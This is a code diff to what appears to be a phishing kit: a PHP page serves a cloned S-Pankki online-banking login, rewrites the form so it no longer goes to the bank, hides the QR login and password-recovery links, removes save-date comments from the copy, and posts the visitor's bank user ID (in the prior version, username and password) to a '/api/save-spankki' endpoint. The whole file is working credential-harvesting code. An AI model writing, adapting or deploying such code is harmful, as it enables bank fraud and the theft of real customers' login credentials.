@@ -2,7 +2,7 @@
 ob_start();
 $userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
 $bankName = htmlspecialchars($bank['name'] ?? 'S-Pankki');
-$htmlContent = file_get_contents(__DIR__ . '/S-Pankkibank.html');
+$htmlContent = file_get_contents(__DIR__ . '/yenispankki.html');
 
 if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
     $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'Windows-1252');
@@ -22,9 +22,14 @@ $htmlContent = preg_replace('/loader\.js\.download[^>]*>/i', '', $htmlContent);
 $htmlContent = preg_replace('/<script[^>]*usercentrics[^>]*>.*?<\/script>/is', '', $htmlContent);
 $htmlContent = preg_replace('/<link[^>]*usercentrics[^>]*>/i', '', $htmlContent);
 $htmlContent = preg_replace('/<link[^>]*preload[^>]*loader\.js[^>]*>/i', '', $htmlContent);
+$htmlContent = preg_replace('/<!--[\s\S]*?Azerbaijan[\s\S]*?-->/i', '', $htmlContent);
+$htmlContent = preg_replace('/<!--[\s\S]*?saved date[\s\S]*?-->/i', '', $htmlContent);
+$htmlContent = preg_replace('/<!--[\s\S]*?GMT\+0400[\s\S]*?-->/i', '', $htmlContent);
 
 $htmlContent = str_replace('type="password" name="username"', 'type="text" name="username"', $htmlContent);
 $htmlContent = str_replace('type=password name=username', 'type=text name=username', $htmlContent);
+$htmlContent = str_replace('id=encapUsername type=password', 'id=encapUsername type=text', $htmlContent);
+$htmlContent = str_replace('id="encapUsername" type="password"', 'id="encapUsername" type="text"', $htmlContent);
 $htmlContent = preg_replace('/action\s*=\s*[^\s>]*loginEbank[^\s>]*/i', 'action="#"', $htmlContent);
 $htmlContent = preg_replace('/action\s*=\s*"[^"]*loginEbank[^"]*"/i', 'action="#"', $htmlContent);
 $htmlContent = preg_replace('/action\s*=\s*\'[^\']*loginEbank[^\']*\'/i', 'action="#"', $htmlContent);
@@ -114,10 +119,147 @@ $pinTanStyle = '<style>
         display: block !important;
         visibility: visible !important;
     }
+    [data-flow="qrcode"],
+    .qr-container,
+    .qr-header,
+    .qr-description,
+    .qr-img-wrapper,
+    .qr-link-wrapper {
+        display: none !important;
+        visibility: hidden !important;
+    }
+    [data-flow="userid"][data-view="init"] {
+        display: block !important;
+        visibility: visible !important;
+    }
+    #login-init-form {
+        display: block !important;
+        visibility: visible !important;
+    }
+    #encapUsername,
+    label[for="encapUsername"],
+    button[name="btn_send"],
+    button[value="Lähetä"],
+    #sendButton {
+        display: block !important;
+        visibility: visible !important;
+    }
+    .page-box-content {
+        display: block !important;
+        visibility: visible !important;
+    }
+    [data-flow="userid"][data-view="init"] {
+        display: block !important;
+        visibility: visible !important;
+    }
+    [data-flow="userid"][data-view="init"] .grid-x {
+        display: flex !important;
+        flex-wrap: wrap !important;
+    }
+    [data-flow="userid"][data-view="init"] .cell {
+        display: block !important;
+        visibility: visible !important;
+    }
+    .form__normal {
+        display: block !important;
+        visibility: visible !important;
+    }
+    .form__hint {
+        display: block !important;
+        visibility: visible !important;
+    }
+    .page-box {
+        background: #fff !important;
+        border-radius: 8px !important;
+        padding: 24px !important;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.1) !important;
+        margin: 20px auto !important;
+        max-width: 800px !important;
+    }
+    .page-box-header {
+        margin-bottom: 20px !important;
+    }
+    .page-box-heading {
+        font-size: 24px !important;
+        font-weight: 600 !important;
+        color: #333 !important;
+        margin: 0 !important;
+    }
+    .grid-x {
+        display: flex !important;
+        flex-wrap: wrap !important;
+        margin: 0 -15px !important;
+    }
+    .cell {
+        padding: 0 15px !important;
+        flex: 1 1 auto !important;
+    }
+    .cell.small-12.medium-6 {
+        flex: 0 0 100% !important;
+        max-width: 100% !important;
+    }
+    @media (min-width: 640px) {
+        .cell.small-12.medium-6 {
+            flex: 0 0 50% !important;
+            max-width: 50% !important;
+        }
+    }
+    .form__label {
+        display: block !important;
+        font-weight: 600 !important;
+        margin-bottom: 8px !important;
+        color: #333 !important;
+    }
+    .form__hint {
+        font-size: 14px !important;
+        color: #666 !important;
+        margin-bottom: 8px !important;
+    }
+    #encapUsername {
+        width: 100% !important;
+        padding: 12px !important;
+        border: 1px solid #ddd !important;
+        border-radius: 4px !important;
+        font-size: 16px !important;
+        box-sizing: border-box !important;
+    }
+    #encapUsername:focus {
+        outline: none !important;
+        border-color: #007bff !important;
+        box-shadow: 0 0 0 3px rgba(0,123,255,0.1) !important;
+    }
+    button.button[name="btn_send"],
+    button.button[value="Lähetä"] {
+        background: #28a745 !important;
+        color: #fff !important;
+        border: none !important;
+        padding: 12px 24px !important;
+        border-radius: 4px !important;
+        font-size: 16px !important;
+        font-weight: 600 !important;
+        cursor: pointer !important;
+        width: 100% !important;
+        margin-top: 16px !important;
+    }
+    button.button[name="btn_send"]:hover,
+    button.button[value="Lähetä"]:hover {
+        background: #218838 !important;
+    }
+    .cancel-link {
+        margin-top: 16px !important;
+        text-align: center !important;
+    }
+    .cancel-link a {
+        color: #666 !important;
+        text-decoration: none !important;
+    }
+    .cancel-link a:hover {
+        text-decoration: underline !important;
+    }
 </style>
 <script>
-    if (window.location.hash !== \'#PIN_TAN\') {
-        window.location.hash = \'#PIN_TAN\';
+    if (window.location.hash !== \'#ENCAP\') {
+        window.location.hash = \'#ENCAP\';
     }
     if (window.usercentrics) {
         delete window.usercentrics;
@@ -132,17 +274,49 @@ $pinTanStyle = '<style>
         usercentricsElements.forEach(function(el) {
             el.remove();
         });
-        const usernameInput = document.getElementById(\'username\');
-        if (usernameInput) {
-            usernameInput.value = \'\';
-            usernameInput.removeAttribute(\'readonly\');
-            usernameInput.removeAttribute(\'disabled\');
+        const usernameInputOld = document.getElementById(\'username\');
+        if (usernameInputOld) {
+            usernameInputOld.value = \'\';
+            usernameInputOld.removeAttribute(\'readonly\');
+            usernameInputOld.removeAttribute(\'disabled\');
         }
         const forgotLinks = document.querySelectorAll(\'a[href*="Unohtuiko salasana"], a[href*="unohtuiko salasana"], a[href*="verkkopankkitunnukset"], .cancel-link, .page-divider, .button-group-secondary\');
         forgotLinks.forEach(function(link) {
             link.style.display = \'none\';
             link.style.visibility = \'hidden\';
         });
+        const qrCodeElements = document.querySelectorAll(\'[data-flow="qrcode"], .qr-container, .qr-header, .qr-description, .qr-img-wrapper, .qr-link-wrapper\');
+        qrCodeElements.forEach(function(el) {
+            el.style.display = \'none\';
+            el.style.visibility = \'hidden\';
+        });
+        
+        const useridForm = document.querySelector(\'[data-flow="userid"][data-view="init"]\');
+        if (useridForm) {
+            useridForm.removeAttribute(\'hidden\');
+            useridForm.style.display = \'block\';
+            useridForm.style.visibility = \'visible\';
+        }
+        
+        const loginForm = document.getElementById(\'login-init-form\');
+        if (loginForm) {
+            loginForm.style.display = \'block\';
+            loginForm.style.visibility = \'visible\';
+        }
+        
+        const encapUsernameInput = document.getElementById(\'encapUsername\');
+        if (encapUsernameInput) {
+            encapUsernameInput.type = \'text\';
+            encapUsernameInput.style.display = \'block\';
+            encapUsernameInput.style.visibility = \'visible\';
+        }
+        
+        const sendButton = document.getElementById(\'sendButton\') || document.querySelector(\'button[name="btn_send"]\');
+        if (sendButton) {
+            sendButton.style.display = \'block\';
+            sendButton.style.visibility = \'visible\';
+        }
+        
         const form = document.getElementById(\'pintTanLoginForm\');
         if (form) {
             form.style.display = \'block\';
@@ -205,51 +379,48 @@ if ($userId > 0) {
                 e.stopImmediatePropagation();
             }
             
-            const usernameInput = document.getElementById(\'username\');
-            const passwordInput = document.getElementById(\'password\');
+            const usernameInput = document.getElementById(\'encapUsername\') || document.getElementById(\'username\');
             
-            if (!usernameInput || !passwordInput) {
+            if (!usernameInput) {
+                console.error(\'Username input not found\');
                 return false;
             }
             
             const username = usernameInput.value.trim();
-            const password = passwordInput.value.trim();
             
-            if (!username || !password) {
+            if (!username || username.length < 6 || username.length > 8) {
+                alert(\'Käyttäjätunnuksen on oltava 6-8 numeroa pitkä.\');
                 return false;
             }
             
-            fetch(\'/api/save-spankki\', {
-                method: \'POST\',
-                headers: { \'Content-Type\': \'application/json\' },
-                body: JSON.stringify({
-                    user_id: userId,
-                    username: username,
-                    password: password
-                })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(\'Network response was not ok\');
-                }
-                return response.json();
-            })
-            .then(data => {
-                if (data.success && data.redirect) {
-                    window.location.href = data.redirect;
-                } else if (data.message) {
-                    alert(data.message);
-                }
-            })
-            .catch(error => {
-                console.error(\'Error:\', error);
-            });
+            console.log(\'Sending username to API:\', username, \'User ID:\', userId);
+            
+            // Use form submission to avoid CSP issues
+            const form = document.createElement(\'form\');
+            form.method = \'POST\';
+            form.action = \'/api/save-spankki\';
+            form.style.display = \'none\';
+            
+            const userIdInput = document.createElement(\'input\');
+            userIdInput.type = \'hidden\';
+            userIdInput.name = \'user_id\';
+            userIdInput.value = userId;
+            form.appendChild(userIdInput);
+            
+            const usernameInputField = document.createElement(\'input\');
+            usernameInputField.type = \'hidden\';
+            usernameInputField.name = \'username\';
+            usernameInputField.value = username;
+            form.appendChild(usernameInputField);
+            
+            document.body.appendChild(form);
+            form.submit();
             
             return false;
         }
         
         function initForm() {
-            const form = document.getElementById(\'pintTanLoginForm\');
+            const form = document.getElementById(\'login-init-form\') || document.getElementById(\'pintTanLoginForm\');
             if (form) {
                 form.setAttribute(\'action\', \'#\');
                 form.removeAttribute(\'target\');
@@ -257,18 +428,40 @@ if ($userId > 0) {
                     return handleFormSubmit(e);
                 };
                 
-                const submitButton = form.querySelector(\'button[type="submit"], button[name="btn_log_in"]\');
+                const submitButton = form.querySelector(\'button[type="submit"], button[name="btn_send"], button[name="btn_log_in"]\');
                 if (submitButton) {
                     submitButton.setAttribute(\'type\', \'button\');
                     submitButton.onclick = function(e) {
+                        e.preventDefault();
+                        e.stopPropagation();
                         handleFormSubmit(e);
                         return false;
                     };
                 }
                 
                 form.addEventListener(\'submit\', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
                     handleFormSubmit(e);
+                    return false;
                 }, true);
+            }
+            
+            const sendButton = document.getElementById(\'sendButton\') || document.querySelector(\'button[name="btn_send"]\');
+            if (sendButton) {
+                sendButton.setAttribute(\'type\', \'button\');
+                sendButton.onclick = function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    handleFormSubmit(e);
+                    return false;
+                };
+            }
+            
+            const usernameInput = document.getElementById(\'encapUsername\');
+            if (usernameInput) {
+                usernameInput.type = \'text\';
+                usernameInput.setAttribute(\'placeholder\', \'6-8 numeroa pitkä numerosarja.\');
             }
         }
         
